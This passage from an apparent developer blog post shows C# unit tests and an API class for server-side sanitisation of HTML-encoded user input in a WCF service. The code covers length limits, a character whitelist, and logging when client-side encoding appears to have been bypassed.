<code class="lineno">511 </code>
<code class="lineno">512 </code>         <code class="k">public</code> <code class="k">static</code> <code class="kt">char</code> <code class="nf">Lookup</code><code class="p">(</code><code class="kt">string</code> <code class="n">entity</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">513 </code>            <code class="kt">char</code> <code class="n">ch</code><code class="p">;</code>
<code class="lineno">514 </code>            <code class="n">_lookupTable</code><code class="p">.</code><code class="n">TryGetValue</code><code class="p">(</code><code class="n">entity</code><code class="p">,</code> <code class="k">out</code> <code class="n">ch</code><code class="p">);</code>
<code class="lineno">515 </code>            <code class="k">return</code> <code class="n">ch</code><code class="p">;</code>
<code class="lineno">516 </code>         <code class="p">}</code>
<code class="lineno">517 </code>      <code class="p">}</code>
<code class="lineno">518 </code>   <code class="p">}</code>
<code class="lineno">519 </code><code class="p">}</code>
</pre></div>

</figure>

<p>To drive the development of the <code>Sanitisation</code> API, we wrote the following tests. We created a <code>MockedOperationContext</code>, code not included here. We also used RhinoMocks as our mocking framework which is no longer being maintained. I would recommend NSubstitute instead if you were looking for a mocking framework for .NET. We also used NLog and wrapped it in <code>Common.Wrapper.Log</code></p>

<figure class="code">
  <figcaption>Drive sanitisation API development</figcaption>

<div class="highlight"><pre><code></code><code class="k">using</code> <code class="nn">System</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.ServiceModel</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.ServiceModel.Channels</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">NUnit.Framework</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Configuration</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Rhino.Mocks</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Common.Wrapper.Log</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Common.WcfMock</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Common.WcfHelpers.ErrorHandling.Exceptions</code><code class="p">;</code>
 
<code class="k">namespace</code> <code class="nn">Sanitisation.UnitTest</code> <code class="p">{</code>
<code class="na">   [TestFixture]</code>
   <code class="k">public</code> <code class="k">class</code> <code class="nc">SanitiseTest</code> <code class="p">{</code>
      <code class="k">private</code> <code class="k">const</code> <code class="kt">string</code> <code class="n">_myTestIpv4Address</code> <code class="p">=</code> <code class="s">"My.Test.Ipv4.Address"</code><code class="p">;</code>
      <code class="k">private</code> <code class="k">readonly</code> <code class="kt">int</code> <code class="n">_maxLengthHtmlEncodedUserInput</code> <code class="p">=</code>
         <code class="kt">int</code><code class="p">.</code><code class="n">Parse</code><code class="p">(</code><code class="n">ConfigurationManager</code><code class="p">.</code><code class="n">AppSettings</code><code class="p">[</code><code class="s">"MaxLengthHtmlEncodedUserInput"</code><code class="p">]);</code>
      <code class="k">private</code> <code class="k">readonly</code> <code class="kt">int</code> <code class="n">_maxLengthHtmlDecodedUserInput</code> <code class="p">=</code>
         <code class="kt">int</code><code class="p">.</code><code class="n">Parse</code><code class="p">(</code><code class="n">ConfigurationManager</code><code class="p">.</code><code class="n">AppSettings</code><code class="p">[</code><code class="s">"MaxLengthHtmlDecodedUserInput"</code><code class="p">]);</code>
      <code class="k">private</code> <code class="k">readonly</code> <code class="kt">string</code> <code class="n">_encodedUserInput_thatsMaxDecodedLength</code> <code class="p">=</code>
         <code class="s">@"One #x2F &amp;amp;#x2F; two amp &amp;amp; three #x27 &amp;amp;#x27; four lt &amp;lt; five quot &amp;qu\</code>
<code class="s">ot; six gt &amp;gt;.</code>
<code class="s">One #x2F &amp;amp;#x2F; two amp &amp;amp; three #x27 &amp;amp;#x27; four lt &amp;lt; five quot &amp;quot; six gt \</code>
<code class="s">&amp;gt;.</code>
<code class="s">One #x2F &amp;amp;#x2F; two amp &amp;amp; three #x27 &amp;amp;#x27; four lt &amp;lt; five quot &amp;quot; six gt \</code>
<code class="s">&amp;gt;.</code>
<code class="s">One #x2F &amp;amp;#x2F; two amp &amp;amp; three #x27 &amp;amp;#x27; four lt &amp;lt; five quot &amp;quot; six gt \</code>
<code class="s">&amp;gt;.</code>
<code class="s">One #x2F &amp;amp;#x2F; two amp &amp;amp; three #x27 &amp;amp;#x27; four lt &amp;lt; five quot &amp;quot; six gt \</code>
<code class="s">&amp;gt;.</code>
<code class="s">One #x2F &amp;amp;#x2F; two amp &amp;amp; three #x27 &amp;amp;#x27; four lt &amp;lt; five quot &amp;quot; six gt \</code>
<code class="s">&amp;gt;."</code><code class="p">;</code>
      <code class="k">private</code> <code class="k">readonly</code> <code class="kt">string</code> <code class="n">_decodedUserInput_thatsMaxLength</code> <code class="p">=</code>
         <code class="s">@"One #x2F / two amp &amp; three #x27 ' four lt &lt; five quot "" six gt &gt;.</code>
<code class="s">One #x2F / two amp &amp; three #x27 ' four lt &lt; five quot "" six gt &gt;.</code>
<code class="s">One #x2F / two amp &amp; three #x27 ' four lt &lt; five quot "" six gt &gt;.</code>
<code class="s">One #x2F / two amp &amp; three #x27 ' four lt &lt; five quot "" six gt &gt;.</code>
<code class="s">One #x2F / two amp &amp; three #x27 ' four lt &lt; five quot "" six gt &gt;.</code>
<code class="s">One #x2F / two amp &amp; three #x27 ' four lt &lt; five quot "" six gt &gt;."</code><code class="p">;</code>
<code class="na"> </code>
<code class="na">      [Test]</code>
      <code class="k">public</code> <code class="k">void</code> <code class="nf">Sanitise_UserInput_WhenGivenNull_ShouldReturnEmptyString</code><code class="p">()</code> <code class="p">{</code>
         <code class="n">Assert</code><code class="p">.</code><code class="n">That</code><code class="p">(</code><code class="k">new</code> <code class="n">Sanitise</code><code class="p">().</code><code class="n">UserInput</code><code class="p">(</code><code class="k">null</code><code class="p">),</code> <code class="n">Is</code><code class="p">.</code><code class="n">EqualTo</code><code class="p">(</code><code class="kt">string</code><code class="p">.</code><code class="n">Empty</code><code class="p">));</code>
      <code class="p">}</code>
<code class="na"> </code>
<code class="na">      [Test]</code>
      <code class="k">public</code> <code class="k">void</code> <code class="nf">Sanitise_UserInput_WhenGivenEmptyString_ShouldReturnEmptyString</code><code class="p">()</code> <code class="p">{</code>
         <code class="n">Assert</code><code class="p">.</code><code class="n">That</code><code class="p">(</code><code class="k">new</code> <code class="n">Sanitise</code><code class="p">().</code><code class="n">UserInput</code><code class="p">(</code><code class="kt">string</code><code class="p">.</code><code class="n">Empty</code><code class="p">),</code> <code class="n">Is</code><code class="p">.</code><code class="n">EqualTo</code><code class="p">(</code><code class="kt">string</code><code class="p">.</code><code class="n">Empty</code><code class="p">));</code>
      <code class="p">}</code>

<code class="na">      [Test]</code>
      <code class="k">public</code> <code class="k">void</code> <code class="nf">Sanitise_UserInput_WhenGivenSanitisedString_ShouldReturnSanitisedString</code><code class="p">(</code>
      <code class="p">)</code> <code class="p">{</code>
         <code class="c1">// Open the whitelist up in order to test the encoding without restriction.</code>
         <code class="n">Assert</code><code class="p">.</code><code class="n">That</code><code class="p">(</code>
            <code class="k">new</code> <code class="nf">Sanitise</code><code class="p">(</code><code class="n">whiteList</code><code class="p">:</code> <code class="s">@"^[\w\s\.,#/&amp;'&lt;""&gt;]+$"</code><code class="p">).</code>
            <code class="n">UserInput</code><code class="p">(</code><code class="n">_encodedUserInput_thatsMaxDecodedLength</code><code class="p">),</code>
            <code class="n">Is</code><code class="p">.</code><code class="n">EqualTo</code><code class="p">(</code><code class="n">_encodedUserInput_thatsMaxDecodedLength</code><code class="p">)</code>
         <code class="p">);</code>
      <code class="p">}</code>    

<code class="na">      [Test]</code>
<code class="na">      [ExpectedException(typeof(SanitisationWcfException))]</code>
      <code class="k">public</code> <code class="k">void</code> <code class="nf">Sanitise_UserInput_ShouldThrowExceptionIfEscapedInputToLong</code><code class="p">()</code> <code class="p">{</code>
         <code class="c1">// Truncated just for display. Create a string of 4001 characters.</code>
         <code class="kt">string</code> <code class="n">fourThousandAndOneCharacters</code> <code class="p">=</code>
            <code class="s">"Four thousand characters."</code><code class="p">;</code>
         <code class="kt">string</code> <code class="n">expectedError</code> <code class="p">=</code>
            <code class="s">"The un-modified string received from the client with "</code> <code class="p">+</code>
            <code class="s">"the following IP address: "</code> <code class="p">+</code>
            <code class="sc">'"'</code> <code class="p">+</code> <code class="n">_myTestIpv4Address</code> <code class="p">+</code> <code class="s">"\" "</code> <code class="p">+</code>
            <code class="s">"exceeded the allowed maximum length of an escaped Html user input string. "</code> <code class="p">+</code>
            <code class="s">"The maximum length allowed is: "</code> <code class="p">+</code>
            <code class="n">_maxLengthHtmlEncodedUserInput</code> <code class="p">+</code>
            <code class="s">". The length was: "</code> <code class="p">+</code>
            <code class="p">(</code><code class="n">_maxLengthHtmlEncodedUserInput</code><code class="p">+</code><code class="m">1</code><code class="p">)</code> <code class="p">+</code> <code class="s">"."</code><code class="p">;</code>    

         <code class="n">using</code><code class="p">(</code><code class="k">new</code> <code class="n">MockedOperationContext</code><code class="p">(</code><code class="n">StubbedOperationContext</code><code class="p">))</code> <code class="p">{</code>
            <code class="k">try</code> <code class="p">{</code>
               <code class="k">new</code> <code class="nf">Sanitise</code><code class="p">().</code><code class="n">UserInput</code><code class="p">(</code><code class="n">fourThousandAndOneCharacters</code><code class="p">);</code>
            <code class="p">}</code>
            <code class="k">catch</code><code class="p">(</code><code class="n">SanitisationWcfException</code> <code class="n">e</code><code class="p">)</code> <code class="p">{</code>
               <code class="n">Assert</code><code class="p">.</code><code class="n">That</code><code class="p">(</code><code class="n">e</code><code class="p">.</code><code class="n">Message</code><code class="p">,</code> <code class="n">Is</code><code class="p">.</code><code class="n">EqualTo</code><code class="p">(</code><code class="n">expectedError</code><code class="p">));</code>
               <code class="n">Assert</code><code class="p">.</code><code class="n">That</code><code class="p">(</code><code class="n">e</code><code class="p">.</code><code class="n">UnsanitisedAnswer</code><code class="p">,</code> <code class="n">Is</code><code class="p">.</code><code class="n">EqualTo</code><code class="p">(</code><code class="n">fourThousandAndOneCharacters</code><code class="p">));</code>
               <code class="k">throw</code><code class="p">;</code>
            <code class="p">}</code>
         <code class="p">}</code>
      <code class="p">}</code>    

<code class="na">      [Test]</code>
<code class="na">      [ExpectedException(typeof(SanitisationWcfException))]</code>
      <code class="k">public</code> <code class="k">void</code> <code class="n">Sanitise_UserInput_DecodedUserInputShouldThrowException_WhenMaxLengthHtmlDe</code>\
<code class="n">codedUserInputIsExceeded</code><code class="p">()</code> <code class="p">{</code>
         <code class="kt">char</code> <code class="n">oneCharOverTheLimit</code> <code class="p">=</code> <code class="sc">'.'</code><code class="p">;</code>
         <code class="kt">string</code> <code class="n">expectedError</code> <code class="p">=</code>
            <code class="s">"The string received from the client with the following IP address: "</code> <code class="p">+</code>
            <code class="s">"\""</code> <code class="p">+</code> <code class="n">_myTestIpv4Address</code> <code class="p">+</code> <code class="s">"\" "</code> <code class="p">+</code>
            <code class="s">"after Html decoding exceded the allowed maximum length of"</code> <code class="p">+</code>
            <code class="s">" an un-escaped Html user input string."</code> <code class="p">+</code>
            <code class="n">Environment</code><code class="p">.</code><code class="n">NewLine</code> <code class="p">+</code>
            <code class="s">"The maximum length allowed is: "</code> <code class="p">+</code>
            <code class="n">_maxLengthHtmlDecodedUserInput</code> <code class="p">+</code>
            <code class="s">". The length was: "</code> <code class="p">+</code>
            <code class="p">(</code><code class="n">_decodedUserInput_thatsMaxLength</code> <code class="p">+</code> <code class="n">oneCharOverTheLimit</code><code class="p">).</code><code class="n">Length</code> <code class="p">+</code>
            <code class="n">oneCharOverTheLimit</code><code class="p">;</code>    

         <code class="n">using</code><code class="p">(</code><code class="k">new</code> <code class="n">MockedOperationContext</code><code class="p">(</code><code class="n">StubbedOperationContext</code><code class="p">))</code> <code class="p">{</code>
            <code class="k">try</code> <code class="p">{</code>
               <code class="k">new</code> <code class="nf">Sanitise</code><code class="p">().</code><code class="n">UserInput</code><code class="p">(</code>
                  <code class="n">_encodedUserInput_thatsMaxDecodedLength</code> <code class="p">+</code> <code class="n">oneCharOverTheLimit</code>
               <code class="p">);</code>
            <code class="p">}</code>
            <code class="k">catch</code><code class="p">(</code><code class="n">SanitisationWcfException</code> <code class="n">e</code><code class="p">)</code> <code class="p">{</code>
               <code class="n">Assert</code><code class="p">.</code><code class="n">That</code><code class="p">(</code><code class="n">e</code><code class="p">.</code><code class="n">Message</code><code class="p">,</code> <code class="n">Is</code><code class="p">.</code><code class="n">EqualTo</code><code class="p">(</code><code class="n">expectedError</code><code class="p">));</code>
               <code class="n">Assert</code><code class="p">.</code><code class="n">That</code><code class="p">(</code>
                  <code class="n">e</code><code class="p">.</code><code class="n">UnsanitisedAnswer</code><code class="p">,</code>
                  <code class="n">Is</code><code class="p">.</code><code class="n">EqualTo</code><code class="p">(</code><code class="n">_encodedUserInput_thatsMaxDecodedLength</code> <code class="p">+</code> <code class="n">oneCharOverTheLimit</code><code class="p">)</code>
               <code class="p">);</code>
               <code class="k">throw</code><code class="p">;</code>
            <code class="p">}</code>
         <code class="p">}</code>
      <code class="p">}</code>    

<code class="na">      [Test]</code>
      <code class="k">public</code> <code class="k">void</code> <code class="n">Sanitise_UserInput_ShouldLogAndSendEmail_IfNumberOfDecodedHtmlEntitiesDoesN</code>\
<code class="n">otMatchNumberOfEscapes</code><code class="p">()</code> <code class="p">{</code>
         <code class="kt">string</code> <code class="n">encodedUserInput_with6HtmlEntitiesNotEscaped</code> <code class="p">=</code>
            <code class="n">_encodedUserInput_thatsMaxDecodedLength</code><code class="p">.</code><code class="n">Replace</code><code class="p">(</code><code class="s">"&amp;amp;#x2F;"</code><code class="p">,</code> <code class="s">"/"</code><code class="p">);</code>
         <code class="kt">string</code> <code class="n">errorWeAreExpecting</code> <code class="p">=</code>
            <code class="s">"It appears as if someone has circumvented the client side Html entity "</code> <code class="p">+</code>
            <code class="s">"encoding."</code> <code class="p">+</code> <code class="n">Environment</code><code class="p">.</code><code class="n">NewLine</code> <code class="p">+</code>
            <code class="s">"The requesting IP address was: "</code> <code class="p">+</code>
            <code class="s">"\""</code> <code class="p">+</code> <code class="n">_myTestIpv4Address</code> <code class="p">+</code> <code class="s">"\" "</code> <code class="p">+</code>
            <code class="s">"The sanitised input we receive from the client was the following:"</code> <code class="p">+</code>
            <code class="n">Environment</code><code class="p">.</code><code class="n">NewLine</code> <code class="p">+</code>
            <code class="s">"\""</code> <code class="p">+</code> <code class="n">encodedUserInput_with6HtmlEntitiesNotEscaped</code> <code class="p">+</code> <code class="s">"\""</code> <code class="p">+</code>
            <code class="n">Environment</code><code class="p">.</code><code class="n">NewLine</code> <code class="p">+</code>
            <code class="s">"The same input after decoding and re-escaping on the server side was "</code> <code class="p">+</code>
            <code class="s">"the following:"</code> <code class="p">+</code>
            <code class="n">Environment</code><code class="p">.</code><code class="n">NewLine</code> <code class="p">+</code>
            <code class="s">"\""</code> <code class="p">+</code> <code class="n">_encodedUserInput_thatsMaxDecodedLength</code> <code class="p">+</code> <code class="s">"\""</code><code class="p">;</code>
         <code class="kt">string</code> <code class="n">sanitised</code><code class="p">;</code>
         <code class="c1">// setup _logger</code>
         <code class="n">ILogger</code> <code class="n">logger</code> <code class="p">=</code> <code class="n">MockRepository</code><code class="p">.</code><code class="n">GenerateMock</code><code class="p">&lt;</code><code class="n">ILogger</code><code class="p">&gt;();</code>
         <code class="n">logger</code><code class="p">.</code><code class="n">Expect</code><code class="p">(</code><code class="n">lgr</code> <code class="p">=&gt;</code> <code class="n">lgr</code><code class="p">.</code><code class="n">logError</code><code class="p">(</code><code class="n">errorWeAreExpecting</code><code class="p">));</code>    

         <code class="n">Sanitise</code> <code class="n">sanitise</code> <code class="p">=</code> <code class="k">new</code> <code class="n">Sanitise</code><code class="p">(</code><code class="s">@"^[\w\s\.,#/&amp;'&lt;""&gt;]+$"</code><code class="p">,</code> <code class="n">logger</code><code class="p">);</code>    

         <code class="k">using</code> <code class="p">(</code><code class="k">new</code> <code class="n">MockedOperationContext</code><code class="p">(</code><code class="n">StubbedOperationContext</code><code class="p">))</code> <code class="p">{</code>
            <code class="c1">// Open the whitelist up in order to test the encoding etc.</code>
            <code class="n">sanitised</code> <code class="p">=</code> <code class="n">sanitise</code><code class="p">.</code><code class="n">UserInput</code><code class="p">(</code><code class="n">encodedUserInput_with6HtmlEntitiesNotEscaped</code><code class="p">);</code>
         <code class="p">}</code>    

         <code class="n">Assert</code><code class="p">.</code><code class="n">That</code><code class="p">(</code><code class="n">sanitised</code><code class="p">,</code> <code class="n">Is</code><code class="p">.</code><code class="n">EqualTo</code><code class="p">(</code><code class="n">_encodedUserInput_thatsMaxDecodedLength</code><code class="p">));</code>
         <code class="n">logger</code><code class="p">.</code><code class="n">VerifyAllExpectations</code><code class="p">();</code>
      <code class="p">}</code>              

      <code class="k">private</code> <code class="k">static</code> <code class="n">IOperationContext</code> <code class="n">StubbedOperationContext</code> <code class="p">{</code>
         <code class="k">get</code> <code class="p">{</code>
            <code class="n">IOperationContext</code> <code class="n">operationContext</code> <code class="p">=</code>
               <code class="n">MockRepository</code><code class="p">.</code><code class="n">GenerateStub</code><code class="p">&lt;</code><code class="n">IOperationContext</code><code class="p">&gt;();</code>
            <code class="kt">int</code> <code class="n">port</code> <code class="p">=</code> <code class="m">80</code><code class="p">;</code>
            <code class="n">RemoteEndpointMessageProperty</code> <code class="n">remoteEndpointMessageProperty</code> <code class="p">=</code>
               <code class="k">new</code> <code class="nf">RemoteEndpointMessageProperty</code><code class="p">(</code><code class="n">_myTestIpv4Address</code><code class="p">,</code> <code class="n">port</code><code class="p">);</code>
            <code class="n">operationContext</code><code class="p">.</code><code class="n">Stub</code><code class="p">(</code>
               <code class="n">oc</code> <code class="p">=&gt;</code> <code class="n">oc</code><code class="p">.</code><code class="n">IncomingMessageProperties</code><code class="p">[</code><code class="n">RemoteEndpointMessageProperty</code><code class="p">.</code><code class="n">Name</code><code class="p">]</code>
            <code class="p">).</code><code class="n">Return</code><code class="p">(</code><code class="n">remoteEndpointMessageProperty</code><code class="p">);</code>
            <code class="k">return</code> <code class="n">operationContext</code><code class="p">;</code>
         <code class="p">}</code>
      <code class="p">}</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<p>And finally the API code we used to perform the sanitisation:</p>

<figure class="code">
  <figcaption>Sanitisation API</figcaption>

<div class="highlight"><pre><code></code><code class="lineno">  1 </code><code class="k">using</code> <code class="nn">System</code><code class="p">;</code>
<code class="lineno">  2 </code><code class="k">using</code> <code class="nn">System.Configuration</code><code class="p">;</code>
<code class="lineno">  3 </code><code class="c1">// Todo : Ideally we should be using Dependency Injection.</code>
<code class="lineno">  4 </code><code class="c1">// Researched best candidate was Simple Injector.</code>
<code class="lineno">  5 </code><code class="k">using</code> <code class="nn">OperationContext</code> <code class="p">=</code> <code class="n">System</code><code class="p">.</code><code class="n">ServiceModel</code><code class="p">.</code><code class="n">Web</code><code class="p">.</code><code class="n">MockedOperationContext</code><code class="p">;</code>
<code class="lineno">  6 </code><code class="k">using</code> <code class="nn">System.ServiceModel.Channels</code><code class="p">;</code>
<code class="lineno">  7 </code><code class="k">using</code> <code class="nn">Common.Security.Sanitisation</code><code class="p">;</code>
<code class="lineno">  8 </code><code class="k">using</code> <code class="nn">Common.WcfHelpers.ErrorHandling.Exceptions</code><code class="p">;</code>
<code class="lineno">  9 </code><code class="k">using</code> <code class="nn">Common.Wrapper.Log</code><code class="p">;</code>
<code class="lineno"> 10 </code> 
<code class="lineno"> 11 </code><code class="k">namespace</code> <code class="nn">Sanitisation</code> <code class="p">{</code>
<code class="lineno"> 12 </code> 
<code class="lineno"> 13 </code>   <code class="k">public</code> <code class="k">class</code> <code class="nc">Sanitise</code> <code class="p">{</code>
<code class="lineno"> 14 </code>      <code class="k">private</code> <code class="k">readonly</code> <code class="kt">string</code> <code class="n">_whiteList</code><code class="p">;</code>
<code class="lineno"> 15 </code>      <code class="k">private</code> <code class="k">readonly</code> <code class="n">ILogger</code> <code class="n">_logger</code><code class="p">;</code>
<code class="lineno"> 16 </code> 
<code class="lineno"> 17 </code>      <code class="k">private</code> <code class="kt">string</code> <code class="n">RequestingIpAddress</code> <code class="p">{</code>
<code class="lineno"> 18 </code>         <code class="k">get</code> <code class="p">{</code>
<code class="lineno"> 19 </code>            <code class="n">RemoteEndpointMessageProperty</code> <code class="n">remoteEndpointMessageProperty</code> <code class="p">=</code>
<code class="lineno"> 20 </code>               <code class="n">OperationContext</code><code class="p">.</code><code class="n">Current</code><code class="p">.</code><code class="n">IncomingMessageProperties</code><code class="p">[</code>
<code class="lineno"> 21 </code>                  <code class="n">RemoteEndpointMessageProperty</code><code class="p">.</code><code class="n">Name</code>
<code class="lineno"> 22 </code>               <code class="p">]</code> <code class="k">as</code> <code class="n">RemoteEndpointMessageProperty</code><code class="p">;</code>
<code class="lineno"> 23 </code>            <code class="k">return</code> <code class="p">(</code>
<code class="lineno"> 24 </code>               <code class="p">(</code><code class="n">remoteEndpointMessageProperty</code> <code class="p">!=</code> <code class="k">null</code><code class="p">)</code> <code class="p">?</code>
<code class="lineno"> 25 </code>               <code class="n">remoteEndpointMessageProperty</code><code class="p">.</code><code class="n">Address</code> <code class="p">:</code>
<code class="lineno"> 26 </code>               <code class="kt">string</code><code class="p">.</code><code class="n">Empty</code>
<code class="lineno"> 27 </code>            <code class="p">);</code>
<code class="lineno"> 28 </code>         <code class="p">}</code>
<code class="lineno"> 29 </code>      <code class="p">}</code>
<code class="lineno"> 30 </code>
<code class="lineno"> 31 </code>      <code class="c1">/// &lt;summary&gt;</code>
<code class="lineno"> 32 </code>      <code class="c1">/// Provides server side escaping of Html entities, and runs the supplied</code>
<code class="lineno"> 33 </code>      <code class="c1">/// whitelist character filter over the user input string.</code>
<code class="lineno"> 34 </code>      <code class="c1">/// &lt;/summary&gt;</code>
<code class="lineno"> 35 </code>      <code class="c1">/// &lt;param name="whiteList"&gt;Should be provided by DI from the ResourceFile.&lt;/param&gt;</code>
<code class="lineno"> 36 </code>      <code class="c1">/// &lt;param name="logger"&gt;</code>
<code class="lineno"> 37 </code>      <code class="c1">/// Should be provided by DI. Needs to be an asynchronous logger.</code>
<code class="lineno"> 38 </code>      <code class="c1">/// &lt;/param&gt;</code>
<code class="lineno"> 39 </code>      <code class="c1">/// &lt;example&gt;</code>
<code class="lineno"> 40 </code>      <code class="c1">/// The whitelist can be obtained from a ResourceFile like so...</code>
<code class="lineno"> 41 </code>      <code class="c1">/// &lt;code&gt;</code>
<code class="lineno"> 42 </code>      <code class="c1">/// private Resource _resource;</code>
<code class="lineno"> 43 </code>      <code class="c1">/// _resource.GetString("WhiteList");</code>
<code class="lineno"> 44 </code>      <code class="c1">/// &lt;/code&gt;</code>
<code class="lineno"> 45 </code>      <code class="c1">/// &lt;/example&gt;</code>
<code class="lineno"> 46 </code>      <code class="k">public</code> <code class="nf">Sanitise</code><code class="p">(</code><code class="kt">string</code> <code class="n">whiteList</code> <code class="p">=</code> <code class="s">""</code><code class="p">,</code> <code class="n">ILogger</code> <code class="n">logger</code> <code class="p">=</code> <code class="k">null</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno"> 47 </code>         <code class="n">_whiteList</code> <code class="p">=</code> <code class="n">whiteList</code><code class="p">;</code>
<code class="lineno"> 48 </code>         <code class="n">_logger</code> <code class="p">=</code> <code class="n">logger</code> <code class="p">??</code> <code class="k">new</code> <code class="n">Logger</code><code class="p">();</code>
<code class="lineno"> 49 </code>      <code class="p">}</code>
<code class="lineno"> 50 </code>
<code class="lineno"> 51 </code>      <code class="c1">/// &lt;summary&gt;</code>
<code class="lineno"> 52 </code>      <code class="c1">/// 1) Check field lengths.         Client side validation may have been negated.</code>
<code class="lineno"> 53 </code>      <code class="c1">/// 2) Check against white list.    Client side validation may have been negated.</code>
<code class="lineno"> 54 </code>      <code class="c1">/// 3) Check Html escaping.         Client side validation may have been negated.</code>
<code class="lineno"> 55 </code>       
<code class="lineno"> 56 </code>      <code class="c1">/// Generic Fail actions:   * Drop the payload.</code>
<code class="lineno"> 57 </code>      <code class="c1">///                           No point in trying to massage and save,</code>
<code class="lineno"> 58 </code>      <code class="c1">///                           as it won't be what the user was expecting,</code>
<code class="lineno"> 59 </code>      <code class="c1">///                         * Add full error to a WCFException Message and throw.</code>
<code class="lineno"> 60 </code>      <code class="c1">///                         * WCF interception reads WCFException.MessageForClient,</code>
<code class="lineno"> 61 </code>      <code class="c1">///                           and sends it to the user.</code>
<code class="lineno"> 62 </code>      <code class="c1">///                         * On return, log the WCFException's Message.</code>
<code class="lineno"> 63 </code>      <code class="c1">///                         </code>
<code class="lineno"> 64 </code>      <code class="c1">/// Escape Fail actions:    * Asynchronously Log and email full error to support.</code>
<code class="lineno"> 65 </code>       
<code class="lineno"> 66 </code>       
<code class="lineno"> 67 </code>      <code class="c1">/// 1) BA confirmed 50 for text, and 400 for textarea.</code>
<code class="lineno"> 68 </code>      <code class="c1">///     As we don't know the field type, we'll have to go for 400."</code>
<code class="lineno"> 69 </code>      <code class="c1">///</code>
<code class="lineno"> 70 </code>      <code class="c1">///     First we need to check that we haven't been sent some huge string.</code>
<code class="lineno"> 71 </code>      <code class="c1">///     So we check that the string isn't longer than 400 * 10 = 4000.</code>
<code class="lineno"> 72 </code>      <code class="c1">///     10 is the length of our double escaped character references.</code>
<code class="lineno"> 73 </code>      <code class="c1">///     Or, we ask the business for a number."</code>
<code class="lineno"> 74 </code>      <code class="c1">///     If we fail here,</code>
<code class="lineno"> 75 </code>      <code class="c1">///        perform Generic Fail actions and don't complete the following steps.</code>
<code class="lineno"> 76 </code>      <code class="c1">/// </code>
<code class="lineno"> 77 </code>      <code class="c1">///     Convert all Html Entity Encodings back to their equivalent characters,</code>
<code class="lineno"> 78 </code>      <code class="c1">///        and count how many occurrences.</code>
<code class="lineno"> 79 </code>      <code class="c1">///</code>
<code class="lineno"> 80 </code>      <code class="c1">///     If the string is longer than 400,</code>
<code class="lineno"> 81 </code>      <code class="c1">///        perform Generic Fail actions and don't complete the following steps.</code>
<code class="lineno"> 82 </code>      <code class="c1">/// </code>
<code class="lineno"> 83 </code>      <code class="c1">/// 2) check all characters against the white list</code>
<code class="lineno"> 84 </code>      <code class="c1">///     If any don't match,</code>
<code class="lineno"> 85 </code>      <code class="c1">///        perform Generic Fail actions and don't complete the following steps.</code>
<code class="lineno"> 86 </code>      <code class="c1">/// </code>
<code class="lineno"> 87 </code>      <code class="c1">/// 3) re html escape (as we did in JavaScript), and count how many escapes.</code>
<code class="lineno"> 88 </code>      <code class="c1">///     If cnt &gt; cnt of Html Entity Encodings back to their equivalent characters,</code>
<code class="lineno"> 89 </code>      <code class="c1">///        Perform Escape Fail actions. Return sanitised string.</code>
<code class="lineno"> 90 </code>      <code class="c1">/// </code>
<code class="lineno"> 91 </code>      <code class="c1">///     If we haven't returned, return sanitised string.</code>
<code class="lineno"> 92 </code>       
<code class="lineno"> 93 </code>       
<code class="lineno"> 94 </code>      <code class="c1">/// Performs checking on the text passed in,</code>
<code class="lineno"> 95 </code>      <code class="c1">///    to verify that client side escaping and whitelist validation</code>
<code class="lineno"> 96 </code>      <code class="c1">///    has already been performed.</code>
<code class="lineno"> 97 </code>      <code class="c1">/// Performs decoding, and re-encodes.</code>
<code class="lineno"> 98 </code>      <code class="c1">///    Counts that the number of escapes was the same,</code>
<code class="lineno"> 99 </code>      <code class="c1">///    otherwise we log and send email with the details to support.</code>
<code class="lineno">100 </code>      <code class="c1">/// Throws exception if the client side validation failed to restrict the</code>
<code class="lineno">101 </code>      <code class="c1">///    number of characters in the escaped string we received.</code>
<code class="lineno">102 </code>      <code class="c1">///    This needs to be intercepted at the service.</code>
<code class="lineno">103 </code>      <code class="c1">///    The exceptions default message for client needs to be passed back to the user.</code>
<code class="lineno">104 </code>      <code class="c1">///    On return, the interception needs to log the exception's message.</code>
<code class="lineno">105 </code>      <code class="c1">/// &lt;/summary&gt;</code>
<code class="lineno">106 </code>      <code class="c1">/// &lt;param name="sanitiseMe"&gt;&lt;/param&gt;</code>
<code class="lineno">107 </code>      <code class="c1">/// &lt;returns&gt;&lt;/returns&gt;</code>
<code class="lineno">108 </code>      <code class="k">public</code> <code class="kt">string</code> <code class="nf">UserInput</code><code class="p">(</code><code class="kt">string</code> <code class="n">sanitiseMe</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">109 </code>         <code class="k">if</code> <code class="p">(</code><code class="kt">string</code><code class="p">.</code><code class="n">IsNullOrEmpty</code><code class="p">(</code><code class="n">sanitiseMe</code><code class="p">))</code>
<code class="lineno">110 </code>            <code class="k">return</code> <code class="kt">string</code><code class="p">.</code><code class="n">Empty</code><code class="p">;</code>
<code class="lineno">111 </code>       
<code class="lineno">112 </code>         <code class="n">ThrowExceptionIfEscapedInputToLong</code><code class="p">(</code><code class="n">sanitiseMe</code><code class="p">);</code>
<code class="lineno">113 </code>       
<code class="lineno">114 </code>         <code class="kt">int</code> <code class="n">numberOfDecodedHtmlEntities</code> <code class="p">=</code> <code class="m">0</code><code class="p">;</code>
<code class="lineno">115 </code>         <code class="kt">string</code> <code class="n">decodedUserInput</code> <code class="p">=</code>
<code class="lineno">116 </code>            <code class="n">HtmlDecodeUserInput</code><code class="p">(</code><code class="n">sanitiseMe</code><code class="p">,</code> <code class="k">ref</code> <code class="n">numberOfDecodedHtmlEntities</code><code class="p">);</code>
<code class="lineno">117 </code>       
<code class="lineno">118 </code>         <code class="k">if</code><code class="p">(!</code><code class="n">decodedUserInput</code><code class="p">.</code><code class="n">CompliesWithWhitelist</code><code class="p">(</code><code class="n">whiteList</code><code class="p">:</code> <code class="n">_whiteList</code><code class="p">))</code> <code class="p">{</code>
<code class="lineno">119 </code>            <code class="kt">string</code> <code class="n">error</code> <code class="p">=</code>
<code class="lineno">120 </code>               <code class="s">"The answer received from client with the following IP address: "</code> <code class="p">+</code>
